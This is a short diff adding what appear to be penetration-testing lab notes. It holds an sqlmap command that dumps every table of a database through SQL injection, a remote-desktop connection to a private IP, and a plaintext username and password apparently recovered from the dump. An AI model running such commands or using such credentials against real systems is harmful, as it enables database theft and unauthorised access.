@@ -1,0 +1,4 @@
+sqlmap -r request --level 2 --risk 2 -D archive --dump-all
+
+rdesktop 10.11.1.229
+eric:sup3rs3cr3t
